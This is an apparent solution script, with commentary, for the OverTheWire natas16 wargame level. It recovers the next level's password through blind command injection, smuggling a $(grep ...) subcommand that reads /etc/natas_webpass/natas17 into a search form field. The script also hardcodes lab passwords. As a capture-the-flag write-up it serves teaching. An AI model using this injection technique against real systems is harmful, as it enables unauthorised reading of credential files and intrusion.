#!/usr/bin/env python

import requests
import re

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

pass_length = len(password)
passwd = ""

# those are the valid letters in each password
letters = "0123456789"
for x in range(65, 91):
    letters += chr(x)
for x in range(97, 123):
    letters += chr(x)


for i in range(pass_length):
    for char in letters:
        blind_grep = (
            "anythings$(grep ^" + passwd + char + " /etc/natas_webpass/natas17)"
        )
        post_data = {"needle": blind_grep}
        response = session.post(url, data=post_data, auth=(username, password))
        content = response.text
        pattern = re.findall("<pre>\n(.*)\n</pre>", content)
        if not pattern:
            passwd += char
            break
    print(passwd)

# content = response.text
# soup = BeautifulSoup(content,"html.parser").prettify()
# print (soup)
# print content

# by going to source page /index-source.html
# it's less more like natas10,
# but this time it's making some validations using reqular expressions
# so, we may be able to broke without using any of things like ; / \ ' "
# but still we can try to execute something with $(cat /etc/natas_webpass/natas17)
# this command actully pass the filter, but still no thing is showing up
# based on natas16 we may be able to try sort of a bling grep staff
# but this a little different as if the chars we used are part of the password
# then nothing will apppear in the result
# it seems that worked correctly and
#   the pass is 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

